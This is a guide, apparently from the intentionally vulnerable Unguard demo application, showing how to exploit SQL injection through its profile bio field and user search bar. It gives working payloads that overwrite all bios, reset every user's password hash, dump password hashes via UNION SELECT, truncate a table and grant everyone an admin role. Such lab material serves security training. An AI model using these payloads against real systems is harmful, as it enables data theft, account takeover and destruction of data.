# SQL Injection

Utilizing [SQL injection](https://owasp.org/www-community/attacks/SQL_Injection) can lead to sensitive data being read
and/or databases to be modified (Insert/Update/Delete).
In addition, administrative operations such as shutting down the DBMS can also be completed.

Unguard provides the functionality to upload a biography text for each user, and as the string is not checked before
being inserted into an SQL statement, it is possible to insert SQL commands which will then be run. Additionally, the users page that shows all users on the system has a search bar, into which SQL statements can be injected.

## Preconditions and Requirements

For this exploit to work you need:

* [unguard](../../../docs/DEV-GUIDE.md) deployed and running
* (optional) [unguard-exploit-toolkit](../../INSTALL.md) set up

## Exploitation

To inject an SQL command, you simply need to log into Unguard, go to your profile page or to the users page, and then include some
SQL statements in the bio/searchbar which need to be properly prepared (see the next chapter "w/o Toolkit CLI").

### w/o Toolkit CLI

SQL injections are possible via the frontend. As mentioned before, you can use the bio on the profile page or the search bar on the users page to include SQL
code. However, since the bio is stored in the Redis database and the user data accessed via the users page is stored in the MariaDB database, you have access to different tables depending on whether you exploit the bio or the users page search text.

An example for an SQL statement to run using the bio:

```sql
UPDATE bio
SET bio_text = 'injected'
WHERE 1 = 1;
```

This will set the bio_text to 'injected' for every user that already had a bio set.

In order to inject this into the database, the content of the bio needs to be adapted slightly:

1. Bio already exists (button says 'Update Bio')

```
' WHERE 0 = 1; UPDATE bio SET bio_text = 'injected' WHERE 1 = 1; --
```

As you can see, the `'` in the beginning as well as the `--` in the end are added to allow the statement to be
run without causing an error.

2. Bio doesn't yet exist (button says 'Add Bio')

```
'); UPDATE bio SET bio_text = 'injected' WHERE 1 = 1; --
```

In this case, the beginning has to be slightly different to accommodate the syntax of the ```INSERT INTO``` statement.

An example for an SQL statement to run using the user searchbar:

```sql
UPDATE users 
SET password_hash='$2b$10$oYZ0GWhlnYQXgqtf2N24oeXE6JZ4WMNPt8yKCfaLpJAOqaKKyrjda'
WHERE 1 = 1;
```

This will set every user's password to 'password'.

To have this executed on the database, you need to modify the SQL command:
```
'; UPDATE users SET password_hash='$2b$10$oYZ0GWhlnYQXgqtf2N24oeXE6JZ4WMNPt8yKCfaLpJAOqaKKyrjda' WHERE 1 = 1; --
```

If you want to see the results of a SELECT operation, you can use the UNION keyword:
```
' UNION SELECT id+9999, username, password_hash FROM users; --
```

This will display the password hash beneath the username for each user.

The statements you can execute on the users page are somewhat limited. SELECT, INSERT and UPDATE all work, and so does SHUTDOWN, but REMOVE, TRUNCATE, and DDL statements do not. This appears to be a limitation of the Go MySQL driver, which seemingly requires that these statements be executed with the Go method `Exec` and not with `QueryRows`, the method used in the Go code.


### With Toolkit CLI

Using the `ug-exploit` tool, SQL statements can be injected.
Make sure to use `ug-exploit login` first, as you need to be logged in to post a bio.

Afterwards, use `ug-exploit sql-inject-redis` and type your desired command if you want to inject into the Redis database, or use `ug-exploit sql-inject-mariadb` to inject into the MariaDB database.
When using the CLI, you only need to specify the SQL statement to be injected. In this example,
your input would just need to be:

```sql
UPDATE bio
SET bio_text = 'injected'
WHERE 1 = 1;
```

or, alternatively:

```sql
UPDATE users 
SET password_hash='$2b$10$oYZ0GWhlnYQXgqtf2N24oeXE6JZ4WMNPt8yKCfaLpJAOqaKKyrjda'
WHERE 1 = 1;
```

With the Redis database, the returned status code for this exploit will always be 500, no matter if it was successful or not. With the MariaDB database, 200 means that the statement was successfully executed, and 500 means that there was an error.

#### Examples

Deleting all entries of the table (Redis):
```h2
TRUNCATE TABLE bio;
```

Giving everybody the AD_MANAGER role (MariaDB):
```sql
INSERT INTO users_roles (user_id, role_id) SELECT id AS user_id, (SELECT id FROM roles where name='AD_MANAGER') AS role_id FROM users WHERE id > 1;
```

## Further Details

* [SQL Injection - OWASP](https://owasp.org/www-community/attacks/SQL_Injection)
